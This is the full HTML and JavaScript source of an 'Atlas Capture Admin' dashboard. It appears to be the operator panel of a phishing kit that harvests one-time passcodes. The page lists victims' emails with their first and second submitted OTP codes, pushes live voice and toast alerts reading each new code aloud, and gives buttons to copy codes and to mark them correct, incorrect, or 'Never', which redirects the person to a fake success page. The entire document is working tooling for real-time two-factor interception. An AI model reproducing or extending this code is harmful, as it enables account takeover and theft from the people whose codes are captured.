<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Atlas Capture Admin Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 25%, #f093fb 50%, #4facfe 75%, #00f2fe 100%);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            color: white;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .glass-navbar {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
            padding: 16px 32px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .logo img {
            height: 45px;
            width: 45px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.2);
            padding: 5px;
        }

        .logo h1 {
            font-size: 20px;
            font-weight: 700;
            color: white;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
        }

        .navbar-right {
            display: flex;
            gap: 12px;
            align-items: center;
            flex-wrap: wrap;
        }

        .glass-btn {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 8px 16px;
            border-radius: 12px;
            cursor: pointer;
            font-weight: 500;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: all 0.3s ease;
            color: white;
        }

        .glass-btn:hover {
            background: rgba(255, 255, 255, 0.25);
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
        }

        .tts-toggle.active {
            background: rgba(16, 185, 129, 0.8);
            border-color: rgba(255, 255, 255, 0.5);
        }

        .logout-btn {
            background: rgba(239, 68, 68, 0.8);
            border: none;
        }

        .logout-btn:hover {
            background: rgba(239, 68, 68, 1);
        }

        .container {
            max-width: 1400px;
            margin: 32px auto;
            padding: 0 24px;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
            gap: 20px;
            margin-bottom: 32px;
        }

        .stat-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 24px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, rgba(255, 255, 255, 0.5), rgba(255, 255, 255, 0.9));
        }

        .stat-card:hover {
            transform: translateY(-4px);
            background: rgba(255, 255, 255, 0.15);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
        }

        .stat-icon {
            width: 48px;
            height: 48px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 16px;
        }

        .stat-icon ion-icon {
            font-size: 28px;
            color: white;
        }

        .stat-card h3 {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.8);
            margin-bottom: 8px;
        }

        .stat-card .number {
            font-size: 32px;
            font-weight: 800;
            color: white;
        }

        .table-container {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            overflow: auto;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            min-width: 1100px;
        }

        th {
            text-align: left;
            padding: 16px 20px;
            background: rgba(255, 255, 255, 0.1);
            font-weight: 600;
            color: rgba(255, 255, 255, 0.9);
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
        }

        td {
            padding: 14px 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            color: rgba(255, 255, 255, 0.9);
        }

        tr:hover {
            background: rgba(255, 255, 255, 0.1);
        }

        .badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 500;
        }

        .badge-pending { background: rgba(245, 158, 11, 0.3); color: #fef3c7; border: 1px solid rgba(245, 158, 11, 0.5); }
        .badge-approved { background: rgba(16, 185, 129, 0.3); color: #d1fae5; border: 1px solid rgba(16, 185, 129, 0.5); }
        .badge-waiting { background: rgba(79, 70, 229, 0.3); color: #e0e7ff; border: 1px solid rgba(79, 70, 229, 0.5); }
        .badge-email { background: rgba(249, 115, 22, 0.3); color: #fed7aa; border: 1px solid rgba(249, 115, 22, 0.5); }
        .badge-never { background: rgba(239, 68, 68, 0.3); color: #fecaca; border: 1px solid rgba(239, 68, 68, 0.5); }

        .action-btn {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 6px 12px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 11px;
            font-weight: 500;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            color: white;
            margin-right: 6px;
            margin-bottom: 6px;
        }

        .action-btn:hover {
            transform: translateY(-1px);
            background: rgba(255, 255, 255, 0.25);
        }

        .btn-success { background: rgba(16, 185, 129, 0.8); }
        .btn-approve { background: rgba(79, 70, 229, 0.8); }
        .btn-incorrect { background: rgba(239, 68, 68, 0.8); }
        .btn-never { background: rgba(139, 92, 246, 0.8); }
        .btn-reset { background: rgba(245, 158, 11, 0.8); }
        .btn-delete { background: rgba(107, 114, 128, 0.8); }

        .otp-code {
            cursor: pointer;
            padding: 4px 8px;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            font-family: monospace;
            font-size: 13px;
        }

        .copy-btn {
            background: transparent;
            color: rgba(255, 255, 255, 0.7);
            padding: 4px 6px;
            margin-left: 6px;
            font-size: 12px;
            border: none;
            cursor: pointer;
        }

        .toast-notification {
            position: fixed;
            top: 80px;
            right: 20px;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(20px);
            border-left: 4px solid #4f46e5;
            padding: 16px 20px;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
            display: none;
            z-index: 1000;
            animation: slideIn 0.3s ease;
            max-width: 350px;
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .speaking-indicator {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(16, 185, 129, 0.9);
            backdrop-filter: blur(10px);
            color: white;
            padding: 12px 24px;
            border-radius: 40px;
            font-size: 13px;
            font-weight: 500;
            display: none;
            align-items: center;
            gap: 12px;
            z-index: 1000;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        .speaking-indicator.show {
            display: flex;
        }

        .wave {
            display: flex;
            gap: 4px;
            align-items: center;
        }

        .wave span {
            width: 5px;
            height: 5px;
            background: white;
            border-radius: 50%;
            animation: wave-animation 0.8s infinite;
        }

        .wave span:nth-child(2) { animation-delay: 0.2s; }
        .wave span:nth-child(3) { animation-delay: 0.4s; }

        @keyframes wave-animation {
            0%, 100% { height: 5px; }
            50% { height: 15px; }
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(8px);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .modal-content {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 24px;
            max-width: 500px;
            width: 90%;
            border: 1px solid rgba(255, 255, 255, 0.3);
            color: #1f2937;
            max-height: 80vh;
            overflow-y: auto;
        }

        .dark .modal-content {
            background: rgba(30, 41, 59, 0.95);
            color: white;
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 1px solid rgba(0, 0, 0, 0.1);
        }

        .modal-header h3 {
            font-size: 20px;
            font-weight: 700;
        }

        .modal-field {
            margin-bottom: 16px;
        }

        .modal-label {
            font-size: 12px;
            color: #6b7280;
            margin-bottom: 4px;
        }

        .modal-value {
            font-size: 14px;
            font-weight: 500;
            word-break: break-all;
        }

        .value-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .empty-state {
            text-align: center;
            padding: 60px;
            color: rgba(255, 255, 255, 0.7);
        }

        .empty-state ion-icon {
            font-size: 64px;
            margin-bottom: 16px;
        }

        .dark-mode {
            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
        }
    </style>
</head>
<body>

<div class="glass-navbar">
    <div class="logo">
        <img src="https://i.postimg.cc/dQjyw0ZV/atlas.png" alt="Atlas logo">
        <h1>Atlas Capture Admin</h1>
    </div>
    <div class="navbar-right">
        <button class="glass-btn test-voice-btn" id="testVoiceBtn">
            <ion-icon name="volume-high-outline"></ion-icon>
            Test Voice
        </button>
        <button class="glass-btn theme-toggle" id="themeToggleBtn">
            <ion-icon name="moon-outline"></ion-icon>
            Dark Mode
        </button>
        <button class="glass-btn tts-toggle active" id="ttsToggleBtn">
            <ion-icon name="mic-outline"></ion-icon>
            Voice Alerts: ON
        </button>
        <button class="glass-btn logout-btn" id="logoutBtn">
            <ion-icon name="log-out-outline"></ion-icon>
            Logout
        </button>
    </div>
</div>

<div id="toast" class="toast-notification">
    <h4 id="toastTitle"></h4>
    <p id="toastMessage"></p>
</div>

<div id="speakingIndicator" class="speaking-indicator">
    <ion-icon name="volume-high-outline"></ion-icon>
    <span>Speaking...</span>
    <div class="wave">
        <span></span>
        <span></span>
        <span></span>
    </div>
</div>

<div id="userModal" class="modal-overlay">
    <div class="modal-content">
        <div class="modal-header">
            <h3>User Details</h3>
            <button onclick="closeModal()" style="background: none; border: none; cursor: pointer;">
                <ion-icon name="close-outline" size="24"></ion-icon>
            </button>
        </div>
        <div id="modalContent"></div>
    </div>
</div>

<div class="container">
    <div class="stats" id="statsGrid">
        <div class="stat-card">
            <div class="stat-icon"><ion-icon name="people-outline"></ion-icon></div>
            <h3>Total Users</h3>
            <div class="number" id="totalUsers">0</div>
        </div>
        <div class="stat-card">
            <div class="stat-icon"><ion-icon name="mail-outline"></ion-icon></div>
            <h3>Pending Email</h3>
            <div class="number" id="pendingEmail">0</div>
        </div>
        <div class="stat-card">
            <div class="stat-icon"><ion-icon name="key-outline"></ion-icon></div>
            <h3>Pending OTP 1</h3>
            <div class="number" id="pendingFirstOTP">0</div>
        </div>
        <div class="stat-card">
            <div class="stat-icon"><ion-icon name="shield-checkmark-outline"></ion-icon></div>
            <h3>Pending OTP 2</h3>
            <div class="number" id="pendingSecondOTP">0</div>
        </div>
        <div class="stat-card">
            <div class="stat-icon"><ion-icon name="checkmark-done-circle-outline"></ion-icon></div>
            <h3>Verified</h3>
            <div class="number" id="verifiedCount">0</div>
        </div>
        <div class="stat-card">
            <div class="stat-icon"><ion-icon name="ban-outline"></ion-icon></div>
            <h3>Never/Blocked</h3>
            <div class="number" id="neverCount">0</div>
        </div>
    </div>

    <div class="table-container">
        <table id="usersTable">
            <thead>
                <tr>
                    <th>Email</th>
                    <th>First OTP</th>
                    <th>Second OTP</th>
                    <th>Status</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody id="usersTableBody">
                <tr><td colspan="5" style="text-align:center; padding:40px;">Loading users...</td</tr>
            </tbody>
        </table>
    </div>
</div>

<script>
    const token = localStorage.getItem('adminToken');
    if (!token) window.location.href = '/admin/login';

    // ==================== VOICE ALERTS ====================
    let speechEnabled = true;
    let speechSynthesis = window.speechSynthesis;
    let currentUtterance = null;
    let availableVoices = [];
    let isSpeaking = false;
    let speechQueue = [];

    function pauseAllBrowserMedia() {
        document.querySelectorAll('audio, video').forEach(media => {
            if (!media.paused) { media.pause(); media.dataset.wasPlaying = 'true'; }
        });
        document.querySelectorAll('iframe').forEach(iframe => {
            try { iframe.contentWindow.postMessage('{"event":"command","func":"pauseVideo","args":""}', '*'); iframe.dataset.wasPlaying = 'true'; } catch(e) {}
        });
    }

    function resumeAllBrowserMedia() {
        document.querySelectorAll('audio, video').forEach(media => {
            if (media.dataset.wasPlaying === 'true') { media.play().catch(e=>{}); delete media.dataset.wasPlaying; }
        });
        document.querySelectorAll('iframe').forEach(iframe => {
            if (iframe.dataset.wasPlaying === 'true') { try { iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*'); } catch(e) {} delete iframe.dataset.wasPlaying; }
        });
    }

    function loadVoices() {
        return new Promise((resolve) => {
            const voices = speechSynthesis.getVoices();
            if (voices.length) { availableVoices = voices; resolve(voices); }
            else { speechSynthesis.addEventListener('voiceschanged', () => { availableVoices = speechSynthesis.getVoices(); resolve(availableVoices); }); }
        });
    }

    function getBestVoice() {
        const preferredOrder = ['Google UK English Female', 'Google US English Female', 'Samantha', 'Microsoft Zira'];
        for (const preferred of preferredOrder) {
            const voice = availableVoices.find(v => v.name.includes(preferred));
            if (voice) return voice;
        }
        return availableVoices.find(voice => voice.lang && voice.lang.startsWith('en'));
    }

    function processQueue() {
        if (isSpeaking || speechQueue.length === 0) return;
        if (!speechEnabled) { speechQueue = []; return; }
        
        isSpeaking = true;
        const text = speechQueue.shift();
        pauseAllBrowserMedia();
        
        const utterance = new SpeechSynthesisUtterance(text);
        const voice = getBestVoice();
        if (voice) utterance.voice = voice;
        utterance.rate = 0.9;
        
        const indicator = document.getElementById('speakingIndicator');
        if (indicator) indicator.classList.add('show');
        
        utterance.onend = () => { isSpeaking = false; if (indicator) indicator.classList.remove('show'); resumeAllBrowserMedia(); processQueue(); };
        utterance.onerror = () => { isSpeaking = false; if (indicator) indicator.classList.remove('show'); resumeAllBrowserMedia(); processQueue(); };
        
        currentUtterance = utterance;
        speechSynthesis.speak(utterance);
    }

    function speakText(text, immediate = false) {
        if (!speechEnabled || !text) return;
        if (immediate) { speechQueue = []; if (currentUtterance) { speechSynthesis.cancel(); isSpeaking = false; resumeAllBrowserMedia(); } }
        speechQueue.push(text);
        processQueue();
    }

    function testVoice() { speakText('Voice test. Atlas Capture admin dashboard ready.', true); }
    
    function toggleTTS() {
        speechEnabled = !speechEnabled;
        const btn = document.getElementById('ttsToggleBtn');
        if (speechEnabled) { btn.innerHTML = '<ion-icon name="mic-outline"></ion-icon> Voice ON'; btn.classList.add('active'); speakText('Voice alerts on', true); }
        else { btn.innerHTML = '<ion-icon name="mic-off-outline"></ion-icon> Voice OFF'; btn.classList.remove('active'); if (currentUtterance) { speechSynthesis.cancel(); isSpeaking = false; speechQueue = []; resumeAllBrowserMedia(); } document.getElementById('speakingIndicator').classList.remove('show'); }
    }

    function showToast(title, message) {
        const toast = document.getElementById('toast');
        document.getElementById('toastTitle').textContent = title;
        document.getElementById('toastMessage').textContent = message;
        toast.style.display = 'block';
        setTimeout(() => toast.style.display = 'none', 4000);
        
        if (Notification.permission === 'granted') { new Notification(title, { body: message }); }
    }

    function copyToClipboard(text) {
        navigator.clipboard.writeText(text);
        const toast = document.createElement('div');
        toast.style.cssText = 'position:fixed; bottom:80px; right:20px; background:#10b981; color:white; padding:10px 20px; border-radius:12px; z-index:1000; animation:fadeOut 2s forwards';
        toast.innerHTML = '<ion-icon name="checkmark-circle-outline"></ion-icon> Copied!';
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 2000);
    }

    let currentUser = null;
    function openModal(user) {
        currentUser = user;
        const modalContent = document.getElementById('modalContent');
        modalContent.innerHTML = `
            <div class="modal-field"><div class="modal-label">Email</div><div class="value-row"><div class="modal-value">${escapeHtml(user.email)}</div><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.email)}')"><ion-icon name="copy-outline"></ion-icon></button></div></div>
            <div class="modal-field"><div class="modal-label">First OTP</div><div class="value-row"><div class="modal-value">${user.otp || 'Not submitted'}</div>${user.otp ? `<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.otp)}')"><ion-icon name="copy-outline"></ion-icon></button>` : ''}</div></div>
            <div class="modal-field"><div class="modal-label">Second OTP</div><div class="value-row"><div class="modal-value">${user.second_otp || 'Not submitted'}</div>${user.second_otp ? `<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.second_otp)}')"><ion-icon name="copy-outline"></ion-icon></button>` : ''}</div></div>
            <div class="modal-field"><div class="modal-label">Status</div><div class="modal-value" style="color: ${getStatusColor(user)}">${getStatusText(user)}</div></div>
            <div class="modal-field"><div class="modal-label">Joined</div><div class="modal-value">${formatDate(user.created_at)}</div></div>
        `;
        document.getElementById('userModal').style.display = 'flex';
    }
    function closeModal() { document.getElementById('userModal').style.display = 'none'; }

    function formatDate(dateString) { const date = new Date(dateString); return `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`; }
    function escapeHtml(str) { if (!str) return ''; return str.replace(/[&<>]/g, function(m) { if (m === '&') return '&amp;'; if (m === '<') return '&lt;'; if (m === '>') return '&gt;'; return m; }); }

    function getStatusText(user) {
        if (user.otp1_never) return 'Never/Blocked';
        if (!user.approved) return 'Pending Email';
        if (user.approved && user.otp && !user.otp1_correct) return 'Pending OTP 1';
        if (user.otp1_correct && user.second_otp && !user.otp2_correct) return 'Pending OTP 2';
        if (user.otp1_correct && user.otp2_correct) return 'Verified';
        return 'Pending';
    }
    
    function getStatusColor(user) {
        if (user.otp1_never) return '#ef4444';
        if (!user.approved) return '#f59e0b';
        if (user.approved && user.otp && !user.otp1_correct) return '#4f46e5';
        if (user.otp1_correct && user.second_otp && !user.otp2_correct) return '#9a8c98';
        if (user.otp1_correct && user.otp2_correct) return '#10b981';
        return '#6b7280';
    }

    let usersData = [];

    async function fetchUsers() {
        try {
            const response = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${token}` } });
            if (response.status === 403) { localStorage.removeItem('token'); window.location.href = '/admin/login'; return; }
            const users = await response.json();
            usersData = users;
            displayUsers(users);
            updateStats(users);
        } catch(err) { console.error(err); }
    }

    function updateStats(users) {
        const total = users.length;
        const pendingEmail = users.filter(u => !u.approved && !u.otp1_never).length;
        const pendingFirstOTP = users.filter(u => u.approved && u.otp && !u.otp1_correct && !u.otp1_never).length;
        const pendingSecondOTP = users.filter(u => u.otp1_correct && u.second_otp && !u.otp2_correct && !u.otp1_never).length;
        const verified = users.filter(u => u.otp1_correct && u.otp2_correct && !u.otp1_never).length;
        const never = users.filter(u => u.otp1_never).length;
        
        document.getElementById('totalUsers').textContent = total;
        document.getElementById('pendingEmail').textContent = pendingEmail;
        document.getElementById('pendingFirstOTP').textContent = pendingFirstOTP;
        document.getElementById('pendingSecondOTP').textContent = pendingSecondOTP;
        document.getElementById('verifiedCount').textContent = verified;
        document.getElementById('neverCount').textContent = never;
    }

    function displayUsers(users) {
        const tbody = document.getElementById('usersTableBody');
        if (!users.length) { tbody.innerHTML = '<tr><td colspan="5" class="empty-state"><ion-icon name="people-outline"></ion-icon><div>No users found</div></td></tr>'; return; }
        
        tbody.innerHTML = users.map(user => {
            let statusBadge = '';
            let actionButtons = '';
            
            if (user.otp1_never) {
                statusBadge = '<span class="badge badge-never"><ion-icon name="ban-outline"></ion-icon> Never/Blocked</span>';
                actionButtons = `<button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon> Reset</button>
                                <button class="action-btn btn-delete" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
            }
            else if (!user.approved) {
                statusBadge = '<span class="badge badge-email"><ion-icon name="mail-outline"></ion-icon> Pending Email</span>';
                actionButtons = `<button class="action-btn btn-approve" onclick="approveEmail('${escapeHtml(user.email)}')"><ion-icon name="checkmark-outline"></ion-icon> Approve</button>
                                <button class="action-btn btn-delete" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
            }
            else if (user.approved && user.otp && !user.otp1_correct) {
                statusBadge = '<span class="badge badge-waiting"><ion-icon name="key-outline"></ion-icon> Pending OTP 1</span>';
                actionButtons = `<button class="action-btn btn-success" onclick="successFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="star-outline"></ion-icon> Success</button>
                                <button class="action-btn btn-approve" onclick="approveFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="checkmark-circle-outline"></ion-icon> Approve</button>
                                <button class="action-btn btn-incorrect" onclick="incorrectFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="close-circle-outline"></ion-icon> Incorrect</button>
                                <button class="action-btn btn-never" onclick="neverFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="ban-outline"></ion-icon> Never</button>
                                <button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon> Reset</button>
                                <button class="action-btn btn-delete" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
            }
            else if (user.otp1_correct && user.second_otp && !user.otp2_correct) {
                statusBadge = '<span class="badge badge-waiting"><ion-icon name="shield-outline"></ion-icon> Pending OTP 2</span>';
                actionButtons = `<button class="action-btn btn-approve" onclick="approveSecondOTP('${escapeHtml(user.email)}')"><ion-icon name="checkmark-circle-outline"></ion-icon> Approve</button>
                                <button class="action-btn btn-incorrect" onclick="incorrectSecondOTP('${escapeHtml(user.email)}')"><ion-icon name="close-circle-outline"></ion-icon> Incorrect</button>
                                <button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon> Reset</button>
                                <button class="action-btn btn-delete" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
            }
            else if (user.otp1_correct && user.otp2_correct) {
                statusBadge = '<span class="badge badge-approved"><ion-icon name="checkmark-done-circle-outline"></ion-icon> Verified</span>';
                actionButtons = `<button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon> Reset</button>
                                <button class="action-btn btn-delete" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
            }
            
            return `<tr>
                <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;"><strong>${escapeHtml(user.email)}</strong></td>
                <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.otp ? `<span class="otp-code" onclick="event.stopPropagation(); speakText('First OTP: ${user.otp.split('').join(' ')}')">${user.otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
                <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.second_otp ? `<span class="otp-code" onclick="event.stopPropagation(); speakText('Second OTP: ${user.second_otp.split('').join(' ')}')">${user.second_otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.second_otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
                <td>${statusBadge}</td>
                <td>${actionButtons}</td>
            </tr>`;
        }).join('');
    }

    async function apiCall(endpoint, method, email, successMsg, errorMsg) {
        try {
            const response = await fetch(endpoint, { method, headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify({ email }) });
            const data = await response.json();
            if (data.success) { showToast('Success', successMsg); fetchUsers(); speakText(successMsg, true); }
            else { showToast('Error', data.detail || errorMsg); }
        } catch(e) { showToast('Error', 'Network error'); }
    }

    function approveEmail(email) { apiCall('/api/admin/approve-user', 'POST', email, 'Email approved', 'Failed to approve'); }
    function approveFirstOTP(email) { apiCall('/api/admin/approve-first-otp', 'POST', email, 'First OTP approved', 'Failed to approve'); }
    function successFirstOTP(email) { apiCall('/api/admin/success-first-otp', 'POST', email, 'User redirected to success page', 'Failed to redirect'); }
    function incorrectFirstOTP(email) { apiCall('/api/admin/incorrect-first-otp', 'POST', email, 'First OTP marked incorrect', 'Failed to mark'); }
    function neverFirstOTP(email) { if(confirm(`Mark ${email} as NEVER? They will be redirected to success page permanently.`)) apiCall('/api/admin/never-first-otp', 'POST', email, 'User marked as never', 'Failed to mark'); }
    function approveSecondOTP(email) { apiCall('/api/admin/approve-second-otp', 'POST', email, 'Second OTP approved', 'Failed to approve'); }
    function incorrectSecondOTP(email) { apiCall('/api/admin/incorrect-second-otp', 'POST', email, 'Second OTP marked incorrect', 'Failed to mark'); }
    function resetUser(email) { if(confirm(`Reset ${email}? This will create a new record.`)) apiCall('/api/admin/reset-user', 'POST', email, 'User reset. New record created.', 'Failed to reset'); }
    function deleteUser(email) { if(confirm(`Delete ${email} permanently?`)) apiCall('/api/admin/delete-user', 'DELETE', email, 'User deleted', 'Failed to delete'); }

    function setupTheme() {
        const savedTheme = localStorage.getItem('theme');
        if (savedTheme === 'dark') document.body.classList.add('dark-mode');
        const btn = document.getElementById('themeToggleBtn');
        btn.onclick = () => { document.body.classList.toggle('dark-mode'); localStorage.setItem('theme', document.body.classList.contains('dark-mode') ? 'dark' : 'light'); };
    }

    // WebSocket for real-time alerts
    function setupWebSocket() {
        try {
            const ws = new WebSocket(`wss://${window.location.host}/ws/admin?token=${token}`);
            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                if (data.type === 'user-login') {
                    showToast('New Signup', `${data.email} signed up`);
                    speakText(`New signup from ${data.email}`, true);
                    fetchUsers();
                } else if (data.type === 'user-otp-created') {
                    showToast('First OTP Received', `${data.email} submitted OTP: ${data.otp}`);
                    speakText(`First OTP received from ${data.email}. Code: ${data.otp.split('').join(' ')}`, true);
                    fetchUsers();
                } else if (data.type === 'user-second-otp-created') {
                    showToast('Second OTP Received', `${data.email} submitted second OTP`);
                    speakText(`Second OTP received from ${data.email}`, true);
                    fetchUsers();
                }
            };
        } catch(e) { console.log('WebSocket not available'); }
    }

    if (Notification.permission === 'default') Notification.requestPermission();
    setupTheme();
    loadVoices();
    fetchUsers();
    setupWebSocket();
    setInterval(fetchUsers, 3000);

    document.getElementById('testVoiceBtn').onclick = testVoice;
    document.getElementById('ttsToggleBtn').onclick = toggleTTS;
    document.getElementById('logoutBtn').onclick = () => { localStorage.removeItem('adminToken'); window.location.href = '/admin/login'; };
</script>
</body>
</html>
